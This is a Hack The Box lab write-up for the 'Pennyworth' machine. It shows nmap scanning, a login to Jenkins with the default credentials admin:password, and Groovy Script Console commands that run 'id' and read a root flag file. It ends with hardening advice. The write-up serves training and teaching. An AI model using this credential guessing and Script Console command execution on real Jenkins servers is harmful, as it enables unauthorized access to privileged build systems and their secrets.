# Pennyworth

| | |
|---|---|
| **Platform** | Hack The Box (Starting Point, Tier 1) |
| **OS** | Linux |
| **Difficulty** | Very Easy |
| **Techniques** | Jenkins weak credentials, Script Console (Groovy) RCE |

## Overview
A Jenkins CI server with weak credentials whose Groovy Script Console grants command
execution as the Jenkins process (root here).

## Enumeration
```bash
nmap -sC -sV -oN nmap.txt <TARGET_IP>       # 8080 Jenkins
```

## Exploitation
Logged in with `admin:password`, then **Manage Jenkins > Script Console**. The console
runs Groovy on the server, which is built-in RCE:
```groovy
println "id".execute().text
println "cat /root/flag.txt".execute().text
```
No reverse shell needed when the console returns command output directly.

## Key Takeaway
Never expose Jenkins to untrusted networks; require strong auth + MFA, restrict/disable
the Script Console, and run Jenkins as a low-privilege user, not root.

## My note
When RCE returns output directly (`execute().text`), you often do not need a reverse
shell at all. Reverse shells are for interactive access; for a quick read, run the
command and read the result. Exposed Jenkins with weak creds is a very common real
breach chain because CI servers run privileged and hold secrets.
